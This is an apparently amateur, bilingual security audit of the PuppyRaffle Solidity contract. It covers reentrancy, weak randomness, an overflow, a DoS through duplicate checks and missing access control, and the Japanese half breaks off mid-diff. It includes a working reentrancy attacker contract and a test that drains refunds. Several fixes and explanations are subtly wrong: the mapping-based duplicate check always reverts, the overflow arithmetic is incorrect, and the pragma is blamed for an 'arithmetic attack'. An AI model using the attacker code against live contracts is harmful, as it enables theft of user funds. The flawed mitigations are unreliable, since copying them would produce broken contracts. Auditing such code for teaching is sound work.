# Minimal Audit Report - English [Jump to Japanese Version]{#japanese}

events index missing - ok
self destruct - ok

#

<a name="pragma_outdated"></a>

### [S-Info1] Pragma Version is Outdated, Leading to Arithmetic Attack

**Description:**<br />

The solidity compiler version is outdated, leading to exploits and vulnerabilities that have been fixed in subsequent releases. Contract: `PuppyRaffle.sol`

Given that this error facilitates an Arithmetic Attack and results in the use of outdated Solidity features, it constitutes a high severity issue. These errors will be elaborated upon in their respective sections.

**Impact:**<br />

Vulnerabilities and compatibility issues related to the current compiler version include:

- Arithmetic Attack (one instance found in the contract).
- Inability to use error and revert statements efficiently in the chosen version, which have been supported starting from Solidity version 0.8.0. While these features are recommended for gas efficiency, they also serve as essential security measures that should be available from the outset in the code.

- Upgrading to at least version 0.8.0 would render the `base64` library incompatible with the contract: `PuppyRaffle.sol` , necessitating a rework to reintegrate it. However, it is advisable to update to the latest stable version available.

- The current version may lack other efficient and secure functions, including incompatibility with various libraries, as detailed below:

```javascript
Found incompatible Solidity versions:
src/PuppyRaffle.sol (^0.8.24) imports:
    lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/access/Ownable.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Address.sol (>=0.6.2 <0.8.0)
    lib/base64/base64.sol (>=0.6.0)
    lib/openzeppelin-contracts/contracts/utils/Context.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Metadata.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Enumerable.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/introspection/ERC165.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/math/SafeMath.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Address.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/EnumerableSet.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/EnumerableMap.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Strings.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Context.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/introspection/IERC165.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/introspection/IERC165.sol (>=0.6.0 <0.8.0)
```

**Proof of Concept:**<br />

`PuppyRaffle.sol`

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.24;
```

**Recommended Mitigation:**<br />

- Upgrade the Solidity version and address compatibility issues with the `base64` library and other incompatible libraries package.

#

### [S-Informational2] Unavailability of Basic Functions Due to Outdated Pragma Version, e.g., Error and Revert Statements

**Description:**<br />

As highlighted in the previous finding regarding the pragma version [Here]{#pragma_outdated}, the current version of the contract prohibits the use of error and revert statements, which have been available since Solidity version 0.8.0. These features are not only best practices for gas efficiency but also crucial for security.

**Impact:**<br />

This results in the inability to use fundamental Solidity functions introduced from version 0.7.6 to the latest version, including error and revert statements for efficient error handling.

- Unable to use error and revert statements in the chosen version, to deal with error handling more efficiently.
- Other efficient and secure functions could be missing in the actual version.

**Proof of Concept:**<br />

`PuppyRaffle.sol`

To implement these error handlers, first upgrade the compiler version:

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.24;
```

Then declare errors outside the contract scope, below imports, and replace relevant `require` statements with `error` and `revert` for gas efficiency.

```diff
  (.....other imports.....)
  import {Address} from "@openzeppelin/contracts/utils/Address.sol";
  import {Base64} from "lib/base64/base64.sol";

+ error PuppyRaffle__MustSendEnoughToEnterRaffle(
+     uint256 value,
+     uint256 entranceFeeRequired
+);

contract PuppyRaffle is ERC721, Ownable { ...... rest of the contract ...... }
```

Change `requirement` statements that can be handled by `error` and `revert` statements for gas eficiency:

`PuppyRaffle:enterRaffle()`

```diff
-        require(
-            msg.value == entranceFee * newPlayers.length,
-            "PuppyRaffle: Must send enough to enter raffle"
-        );

        // @audit change the require in an if condition
+       if (msg.value != entranceFee * newPlayers.length) {
+            revert PuppyRaffle__MustSendEnoughToEnterRaffle({
+                value: msg.value,
+                entranceFeerequired: entranceFee * newPlayers.length
+            });
+        }

```

Too see the difference in gas efficiency, run a test before and after the change.

**Recommended Mitigation:**<br />

- Upgrade to at least version 0.8.0, solving compatibility issues with the `base64` library and any other incompatible libraries first.
- Substitute `require` statements that can be handled by `error` and `revert` to enhance gas efficiency.

#

### [S-M1] Players Array Check Leading to a For Loop, Resulting in a DOS Attack, which increments the entry cost for next user.

**Description:**<br />

The handling of the `players` array in the `enterRaffle` function poses a security risk by enabling a DOS (Denial Of Service) attack through inefficient duplicate checking. For a large array, iterating through each index to check for duplicates increases gas costs significantly, potentially making the contract unusable due to prohibitive gas fees.

DOS attack is not limited to bad handling of array in a for loop. Example:

- block gas limit exploits, or a way to impeach the transaction to go through, or to make it impossible to be made due to its cost, or to revert it on a malicious contract each time in the fallback and receive function by putting some condition or acceptance of an asset / gas or minimal necessary amount of gas being too high etc...
- Basically, making the contract unusable for users or, restraining transactions to go through.

**Impact:**<br />

- This flaw disadvantages early and late raffle entrants and allows an attacker to render the contract inoperative, monopolizing the raffle.
- Attacker can add any number of players to the array and make the contract unusable for other users. And still be the winner by matching the right number of player to get one of the addresses they own to be the winner and be refunded in time for no losses on other added accounts by using the weak randomness attack that is also present.

If Users enter the raffle after 1000 of other users, the gas cost will be too high for them to enter the raffle and participate. And the contract will be unusable for them. Leading to a DOS attack.
Depending on how the `enterRaffle` function is made it could even happen for 10 users.

Amount of gas used to enter the raffle paid by the last player that enters after other players:

```javascript
// 143236 gas for 5 players
// 636724 gas for 20 players
// 2156305 gas for 50 players
// 6064707 gas for 98 players
// 17397671 gas for 196 players
```

**Proof of Concept:**<br />

Click the below "Code" button to see code details of a test case that shows the gas cost of the last player entering the raffle after other players.

<details>
<summary>Code</summary>

```javascript
function testCanBlewUpGasPriceWhenLookingForDuplicates() public {
        vm.txGasPrice(1);
        uint256 numberOfPlayers = 98; //1 to 100

        address[] memory players = new address[](uint160(numberOfPlayers));
        for (uint256 i; i < numberOfPlayers; i++) {
            players[i] = address(i);
        }
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAfter = gasleft();
        uint256 gasUsedFirst = (gasBefore - gasAfter) * tx.gasprice;
        console.log(
            "Gas used by the last player of the first array of %s players: %s",
            numberOfPlayers,
            gasUsedFirst
        );

        // Second salve of "x" number of players

        address[] memory playersSecond = new address[](
            uint160(numberOfPlayers)
        );
        for (uint256 i; i < numberOfPlayers; i++) {
            playersSecond[i] = address(i + numberOfPlayers);
        }
        uint256 gasBeforeSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
            playersSecond
        );
        uint256 gasAfterSecond = gasleft();

        uint256 gasUsedSecond = (gasBeforeSecond - gasAfterSecond) *
            tx.gasprice;

        console.log(
            "Gas used by the last player of the second array of %s players: %s",
            players.length,
            gasUsedSecond
        );

        assert(gasUsedFirst < gasUsedSecond);

        // 143236 gas for 5 players
        // 636724 gas for 20 players
        // 2156305 gas for 50 players
        // 6064707 gas for 98 players
        // 17397671 gas for 196 players
    }

```

</details>

**Recommended Mitigation:**<br />

- Users can enter the raffle with a different address. Which bypass the duplicate check, and allows anybody to enter more than once.
- Better to use a mapping to constantly check participants addresses for duplicates. For different raffles, by incorporating a number to the raffle as an id. Ie: Raffle number 1, number 2 etc....

```diff
// @audit if pragma version is above 0.8.0 can use error / revert handlers
// error PuppyRaffle__DuplicatePlayer();

(..... PuppyRaffle contract ......)

    // @audit mapping to check participants and raffle id
+    mapping(address => uint256) public addressToParticipantIndex;
+    uint256 public raffleId = 0;

(..... Rest of the code ......)

..... Within enterRaffle function:

    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
 +      addressToParticipantIndex[newPlayers[i]] = raffleId;
    }

-    // Check for duplicates
+    // @audit check for duplicates based on a raffle ID and a mapping of participants

    for (uint256 i = 0; i < players.length - 1; i++) {
-        for (uint256 j = i + 1; j < players.length; j++) {
-            require(
-                players[i] != players[j],
-                "PuppyRaffle: Duplicate player"
-            );
-        }
+        require(
+            addressToParticipantIndex[players[i]] != raffleId,
+            "PuppyRaffle: Duplicate player"
+        );


    // @audit or use error / revert statement if pragma version is up to date
    // if(addressToParticipantIndex[newPlayers[i]] != raffleId){
    //     revert PuppyRaffle__DuplicatePlayer();
    // }

    }

```

- Can also check those library for the same purpose:
  - [OpenZepplin EnumerableSet](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet)
  - [OpenZeppelin EnumerableMap](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableMap)

#

### [S-M2] Player at index 0 in getActivePlayerIndex(), won't be considered as being an active player leading to no refund possibilities for the player.

**Description:**<br />

The function description stipulate that, if there is no active player in the array, `getActivePlayerIndex()` will returns 0:

`/// @return the index of the player in the array, if they are not active, it returns 0
`

If the only player being active in the raffle session is at index 0, the function will return 0, and the player won't be considered as being an active player. And won't be able to get refunded in the `refund()` function.

```javascript
require(playerAddress !=
  address(0), "PuppyRaffle: Player already refunded, or is not active");
```

**Impact:**<br />

Having any player not being to be refunded, and not being considered as an active player, is a medium severity issue. It is a bad design for the very first player entering the raffle.

**Proof of Concept:**<br />

NEED to write TEST CASE

**Recommended Mitigation:**<br />

- There is 2 different pattern that can be used to correct the logic issue. returning a boolean + the index of the player in the array (ie: no player `false + 0`, active player at index 0 `true + 0`), or returning the max uint256 instead of 0 for denominating that there is no active player in the array.

- Change the logic of the getActivePlayerIndex() function by returning the max uint256 instead of 0 for denominating that there is no active player in the array.

```diff
    /// @notice a way to get the index in the array
    /// @param player the address of a player in the raffle
-    /// @return the index of the player in the array, if they are not active, it returns 0
+    /// @return the index of the player in the array, if they are not active, it returns the max uint256

    function getActivePlayerIndex() public view returns (uint256) {
        for (uint256 i; i < players.length; i++) {
            if (players[i] != address(0)) {
                return i;
            }
        }

        // @audit if there is no active player at index 0, return the max uint
-        return 0;
+        return type(uint256).max;
    }

```

#

### [S-H1] Event in the refund() function should be emitted before the state changes and the state change should be done before refund transaction, to avoid a Re-entrancy attack.

**Description:**<br />

The state change of the `playerIndex` in the `refund()` function should be done before the transaction that sends a value to the user for refunds.

The `RaffleRefunded` event should be emitted before the state changes. It is a best practice to emit the event before the state changes.

It avoid any confusion about the state of the contract, and avoid to let the door open to any reentrancy attack.

**Impact:**<br />

- Can lead to a reentrancy attack, if the state changes before the event is emitted and / or before the transaction to refund a user. Because until the state changed is not terminated, the state is not considered as being changed until then and keep the door open to any other call to the function since it is not considered as terminated yet.

- Leading to sucking refund funds from the contract. And making the refund function unusable for other users has no funds will be left.

**Proof of Concept:**<br />

Run `slither .` in the root folder of the project, there will be the below output details:

<details>
<summary> Click to see Slither output</summary>
```javascript
INFO:Detectors:
Reentrancy in PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#152-175):
        External calls:
        - address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#169)
        State variables written after the call(s):
        - players[playerIndex] = address(0) (src/PuppyRaffle.sol#171)
        PuppyRaffle.players (src/PuppyRaffle.sol#35) can be used in cross function reentrancies:
        - PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#102-148)
        - PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#182-195)
        - PuppyRaffle.players (src/PuppyRaffle.sol#35)
        - PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#152-175)
        - PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#203-244)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1
```
</details>

- Test case to show the reentrancy attack using an attacker contract:

```javascript

    function testCanGetRefundReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        console.log(
            "The balance of the raffle contract before attack is: %s",
            address(puppyRaffle).balance
        );

        // introduce attacker
        AttackReentrant attackerContract = new AttackReentrant(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);

        uint256 attackerContractBalanceBefore = address(attackerContract)
            .balance;

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        console.log(
            "Attacker contract balance before the attack: %s",
            attackerContractBalanceBefore
        );
        console.log(
            "Attacker contract balance after the attack: %s",
            address(attackerContract).balance
        );

               console.log(
            "The balance of the raffle contract after attack is: %s",
            address(puppyRaffle).balance
        );
    }

```

- Attacker contract:

```javascript
contract AttackReentrant {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

```

**Recommended Mitigation:**<br />

- Change the place of where the event is emitted and where the state change is happening to avoid an reentrancy attack on the `refund` function.

```diff
    function refund(uint256 playerIndex) public {
        // @audit it also have a MEV attack in this function, front running the transaction
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );

+        // @audit changing the event and state change place to avoid a re entrancy attack
+       emit RaffleRefunded(playerAddress);
+       players[playerIndex] = address(0);

        payable(msg.sender).sendValue(entranceFee);

-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }

```

- Can also add a reentrancy guard to the function by using openZeppelin library [ReentrancyGuard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard)

#

### [S-H4] Winner and the NFT won can be guessed, weak RNG attack leading to the possibility to win each time. Same goes for the NFT rarity randomness.

**Description:**<br />

The `selectWinner()` function choose a winner based on 3 valued hashed together.

```javascript
        uint256 winnerIndex = uint256(
            keccak256(
                abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
            )
        ) % players.length;
```

The `block.difficulty` is a weak source of randomness, and can be manipulated by a miner to influence the outcome of the hash. It can also be guessed in advance, same for the `block.timestamp`.

- The exact same for NFT rarity randomness.

```javascript
        uint256 rarity = uint256(
            keccak256(abi.encodePacked(msg.sender, block.difficulty))
        ) % 100;
```

**Impact:**<br />

- An attacker could became the winner each time, and get the NFT won each time. And the contract will be unusable for other users.
- The winner does not only win the NFT, it also gets a part of the entrance fee.
- If there is an attacker, the address used to be the winner will change each time to empeach blacklisting. This is to keep in mind.

**Proof of Concept:**<br />

To do

**Recommended Mitigation:**<br />

- To get a mathematiquealy secure random number, use Chainlink VRF (Verifiable Random Function) to get a secure random number and then choose a winner.[Chainlink VRF](https://docs.chain.link/vrf)

- This also needs to be applied to how the rarity of NFT is decided. To avoid any winning manipulation for getting a specific NFT.

#

### [S-H3] Overflow + Loss precision + Unsafe casting of an uint256 to uint64 on the fee calculated before the owner can withdraw it, leading to a loss of funds in what the owner can withdraw.

**Description:**<br />

For solidity version under 0.8.0, int and uint are gonna wrap arround to the beginning. The max of an uint64 is 18446744073709551615. If the totalFees is over this number, it will wrap arround to 0.

- Fees will use 18 decimals. If the total fee has let say 0.1 eth more to its count to be withdrawn so let say 18,5 eth, it will be 100000000000000000 + 18446744073709551615 = 50000000000000000 -> 0,05 eth since it wrap around starting from the begining. So from Zero. (number is not exactly exact, but it will be near the result i gave).

```javascript
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;

        // @audit overflow
        totalFees = totalFees + uint64(fee);
```

- Additionally there is a loss in precision, and the owner will not be able to withdraw the exact amount of fees or the max amount of fees available in the contract that is due to him.

- And there is also an unsafe casting of an uint256 to an uint64. If 20 eth happen to be cast to an uint64, it will wrap arround to 0 from 18.4 eth and it will result in a result of 1.5 eth.

**Impact:**<br />

- Owner will not be able to withdraw more than 18.4 eth of fees, and if that number is reached and beyond. Owner is screwed and will we able to withdraw only dust when counter for fees restart from zero.

- **Proof of Concept:**<br />

To do

**Recommended Mitigation:**<br />

- Do not use uint64 for 18 decimals tokens.
- Should upgrade solidity version to its latest version to avoid this kind of issue.
- Should change uint64 for uint256. Considered as a best practice to use uint256 for 18 decimals tokens, as it is almost computationally hard to reach the max cap.
- Should use SafeMath to avoid overflow in version under 0.8.0. But better to upgrade to the latest version of solidity.

#

### [S-Critical] `_safeMint` in the `selectWinner()` function should be terminate before the transaction that sends a parts of the fees to the winner, to avoid a Re-entrancy attack.

**Description:**<br />

The state change of the `_safeMint` in the `selectWinner()` function should be done before the transaction that sends a parts of the fees to the winner, to avoid a Re-entrancy attack.

It avoid any confusion about the state of the contract, and avoid to let the door open to any reentrancy attack.

**Impact:**<br />

- Doing a re entrancy attack on the `selectWinner` function, an infinite try to get any NFT. And sucking all the fees and eth of the contract.

- The worse part of this attack is not actually the reentrancy, but the access control that is missing that comes together. Anybody at any time can end the raffle, and be selected as the winner. And if the owner hasn't withdrawn the fees, then just calling the function each day at the right time before any owner actions, will slowly suck the fees of the contract.

**Proof of Concept:**<br />

Run `slither .` in the root folder of the project, there will be the below output details:

<details>
<summary> Click to see Slither output</summary>
```javascript
Reentrancy in PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#205-251):
        External calls:
        - (success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#248)
        - _safeMint(winner,tokenId) (src/PuppyRaffle.sol#250)
                - returndata = to.functionCall(abi.encodeWithSelector(IERC721Receiver(to).onERC721Received.selector,_msgSender(),from,tokenId,_data),ERC721: transfer to non ERC721Receiver implementer) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#441-447)
                - (success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)
        External calls sending eth:
        - (success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#248)
        - _safeMint(winner,tokenId) (src/PuppyRaffle.sol#250)
                - (success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)
        Event emitted after the call(s):
        - Transfer(address(0),to,tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#343)
                - _safeMint(winner,tokenId) (src/PuppyRaffle.sol#250)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-3
```
</details>

- Test case to show the reentrancy attack using an attacker contract:

```javascript
to do
```

- Attacker contract:

```javascript
to do

```

**Recommended Mitigation:**<br />

- Change the place of where the `_safeMint` is called, to call it before the transaction that gives the winner is due from fees.

```diff
+       _safeMint(winner, tokenId);
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
-       _safeMint(winner, tokenId);
```

#

### [S-H2] Missing access control on the `selectWinner()` function, leading to the possibility to end the raffle and be selected as the winner at any time.

**Description:**<br />

- The worse part of this attack is not actually the access control missing, but the reentrancy attacks that comes together. Anybody at any time can end the raffle, and be selected as the winner. And if the owner hasn't withdrawn the fees, then just calling the function each day at the right time before any owner actions, will slowly suck the fees of the contract.

**Impact:**<br />

- Severe impact on the use of the raffle by users. Nearly an instant DOS attack to get all NFT and fees left.

**Recommended Mitigation:**<br />

- Add a OnlyOwner modifier to the `selectWinner()` function from the `Ownable` library in use from OpenZeppelin.

```diff
-    function selectWinner() external {
+    function selectWinner() external onlyOwner {
```

<a name="japanese"></a>

# 最小限の監査レポート・日本語版

- S = Severity: 深刻度
- クリティカル・クリット(Crit)= 非常に高い
- 情報系　= お知らせ事項
- 例：S-低＋番号 = 順番的に並んでいる。

#

<a name="pragma_outdated_jp"></a>

### [S-情報系 1] プラグマのバージョンが古いため、算術攻撃が発生

**説明:**<br />

Solidity コンパイラのバージョンが古く、その後修正された脆弱性やエクスプロイトが発生しています。コントラクト：`PuppyRaffle.sol`

このエラーが算術攻撃を容易にし、古い Solidity の機能を使用するため、重大な問題です。これらのエラーについては、それぞれのセクションで詳しく説明します。

**影響:**<br />

現在のコンパイラバージョンに関連する脆弱性と互換性の問題には、以下が含まれます：

- 算術攻撃（コントラクトで 1 例見つかりました）。
- 選択されたバージョンでのエラーおよびリバートステートメントを効率的に使用できない問題があります。これらの機能は Solidity バージョン `0.8.0` からサポートされています。これらの機能はガス効率のために推奨されるだけでなく、コードの初期段階から利用可能であるべき重要なセキュリティ対策です。

- 少なくともバージョン 0.8.0 にアップグレードすると、`base64`ライブラリがコントラクト`PuppyRaffle.sol`と互換性がなくなり、再統合のための再作業が必要になります。ただし、利用可能な最新の安定バージョンに更新することをお勧めします。

- 現在のバージョンでは、他の効率的で安全な機能が不足している可能性があり、さまざまなライブラリとの互換性がない場合があります。詳細は以下のとおりです：

```javascript
Found incompatible Solidity versions:
src/PuppyRaffle.sol (^0.8.24) imports:
    lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/access/Ownable.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Address.sol (>=0.6.2 <0.8.0)
    lib/base64/base64.sol (>=0.6.0)
    lib/openzeppelin-contracts/contracts/utils/Context.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Metadata.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Enumerable.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/introspection/ERC165.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/math/SafeMath.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Address.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/EnumerableSet.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/EnumerableMap.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Strings.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/utils/Context.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/introspection/IERC165.sol (>=0.6.0 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol (>=0.6.2 <0.8.0)
    lib/openzeppelin-contracts/contracts/introspection/IERC165.sol (>=0.6.0 <0.8.0)
```

**概念実証:**<br />

`PuppyRaffle.sol`

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.24;
```

**推奨される軽減策:**<br />

Solidity バージョンをアップグレードし、`base64`ライブラリおよびその他の互換性のないライブラリとの互換性問題に対処してください。

#

### [S-情報系 2] 古いプラグマバージョンによる基本機能の不可用、例：エラーおよびリバートステートメント

**説明:**<br />

前述のプラグマバージョンに関する調査結果で強調されたように, [こちら](#pragma_outdated_jp)、現在のコントラクトのバージョンでは、Solidity バージョン `0.8.0` 以降で利用可能になったエラーおよびリバートステートメントの使用が禁止されています。これらの機能は、ガス効率のためのベストプラクティスであるだけでなく、セキュリティのためにも重要です。

**影響:**<br />

これにより、バージョン`0.7.6`から最新バージョンに至るまでの基本的な Solidity 機能、特にエラーおよびリバートステートメントを効率的にエラーハンドリングするための機能を使用できなくなります。

- 選択されたバージョンでエラーおよびリバートステートメントを効率的に扱うことができません。
- 現在のバージョンでは、他の効率的で安全な機能が不足している可能性があります。

**概念実証:**<br />

`PuppyRaffle.sol`

これらのエラーハンドラを実装するには、まずコンパイラのバージョンをアップグレードする必要があります：

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.24;
```

その後、インポートの下にエラーを宣言し、関連する `require` ステートメントをガス効率のために `error` および `revert` に置き換えます。

```diff
  (.....other imports.....)
  import {Address} from "@openzeppelin/contracts/utils/Address.sol";
  import {Base64} from "lib/base64/base64.sol";

+ error PuppyRaffle__MustSendEnoughToEnterRaffle(
+     uint256 value,
+     uint256 entranceFeeRequired
+);

contract PuppyRaffle is ERC721, Ownable { ...... rest of the contract ...... }
```

ガス効率のために `error`および `revert`ステートメントに処理できる`requirement`ステートメントを変更します：

`PuppyRaffle:enterRaffle()`

```diff
-        require(
-            msg.value == entranceFee * newPlayers.length,
-            "PuppyRaffle: Must send enough to enter raffle"
-        );

        // @audit change the require in an if condition
+       if (msg.value != entranceFee * newPlayers.length) {
+            revert PuppyRaffle__MustSendEnoughToEnterRaffle({
+                value: msg.value,
+                entranceFeerequired: entranceFee * newPlayers.length
+            });
+        }

```

変更前後でのガス効率の違いを確認するために、テストを実行してください。

**推奨される軽減策:**<br />

- 少なくともバージョン 0.8.0 にアップグレードし、最初に base64 ライブラリおよびその他の互換性のないライブラリとの互換性問題を解決してください。
- ガス効率を向上させるために、error および revert で処理できる require ステートメントを置き換えてください。

#

### [S-中 1] `players`配列のチェックが For ループにつながり、次のユーザーのエントリーコストを増加させる DOS 攻撃を引き起こす

**説明:**<br />

`enterRaffle`関数内の`players`配列の処理は、重複を効率的にチェックしないことによって DOS（サービス拒否）攻撃を可能にするセキュリティリスクをもたらします。配列が大きい場合、重複をチェックするために各インデックスを反復処理すると、ガスコストが著しく増加し、ガス料金が禁止的になるため、コントラクトを使用できなくなる可能性があります。

DOS 攻撃は、For ループでの配列の悪い処理に限定されません。例えば：

- ブロックガスリミットのエクスプロイト、またはトランザクションが通過することを妨げる方法、またはそのコストのために不可能にする方法、または悪意のあるコントラクトでフォールバックおよび受信機能のたびにリバートする方法など

- 基本的に、コントラクトをユーザーにとって使用不可能にするか、トランザクションが通過するのを制限します。

**影響:**<br />

- この欠陥は、早期および遅期のラッフル参加者を不利にし、攻撃者がラッフルを独占し、コントラクトを無効にすることを可能にします。

- 攻撃者は配列に任意の数のプレイヤーを追加し、他のユーザーにとってコントラクトを使用できなくすることができます。そして、弱い乱数攻撃を使用して、所有するアドレスの 1 つが勝者であり、時間内に返金されるため、他の追加されたアカウントに損失がないようにすることで、勝者となることができます。

他のユーザーの後にラッフルに参加するユーザーが支払うガスの量は以下のとおりです：

```javascript
// 5人のプレイヤーの場合は143236ガス
// 20人のプレイヤーの場合は636724ガス
// 50人のプレイヤーの場合は2156305ガス
// 98人のプレイヤーの場合は6064707ガス
// 196人のプレイヤーの場合は17397671ガス
```

**概念実証:**<br />

他のプレイヤーの後にラッフルに参加する最後のプレイヤーのガスコストを示すテストケースのコードの詳細を以下の「コード」ボタンをクリックして確認してください。

<details>
<summary>コード</summary>

```javascript
function testCanBlewUpGasPriceWhenLookingForDuplicates() public {
        vm.txGasPrice(1);
        uint256 numberOfPlayers = 98; //1から100まで

        address[] memory players = new address[](uint160(numberOfPlayers));
        for (uint256 i; i < numberOfPlayers; i++) {
            players[i] = address(i);
        }
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAfter = gasleft();
        uint256 gasUsedFirst = (gasBefore - gasAfter) * tx.gasprice;
        console.log(
            "最初の配列の最後のプレイヤーが使用したガス： %s プレイヤー：%s",
            numberOfPlayers,
            gasUsedFirst
        );

        // 2回目の「x」数のプレイヤー

        address[] memory playersSecond = new address[](
            uint160(numberOfPlayers)
        );
        for (uint256 i; i < numberOfPlayers; i++) {
            playersSecond[i] = address(i + numberOfPlayers);
        }
        uint256 gasBeforeSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
            playersSecond
        );
        uint256 gasAfterSecond = gasleft();

        uint256 gasUsedSecond = (gasBeforeSecond - gasAfterSecond) *
            tx.gasprice;

        console.log(
            "2番目の配列の最後のプレイヤーが使用したガス： %s プレイヤー：%s",
            players.length,
            gasUsedSecond
        );

        assert(gasUsedFirst < gasUsedSecond);

        // 5人のプレイヤーの場合は143236ガス
        // 20人のプレイヤーの場合は636724ガス
        // 50人のプレイヤーの場合は2156305ガス
        // 98人のプレイヤーの場合は6064707ガス
        // 196人のプレイヤーの場合は17397671ガス

```

</details>

**推奨される軽減策:**<br />

- ユーザーは異なるアドレスでラッフルに参加することができます。これにより、重複チェックを回避し、誰でも複数回参加することができます。

- 異なるラッフルのために、ラッフルの ID として番号を組み込むことで、参加者のアドレスを常に重複チェックするためにマッピングを使用する方が良いでしょう。例：ラッフル番号 1、番号 2 など...

```diff
// @audit pragmaバージョンが0.8.0以上の場合は、エラー/リバートハンドラを使用できます
// error PuppyRaffle__DuplicatePlayer();

(..... PuppyRaffleコントラクト ......)

    // @audit 参加者とラッフルIDのチェックのためのマッピング
+    mapping(address => uint256) public addressToParticipantIndex;
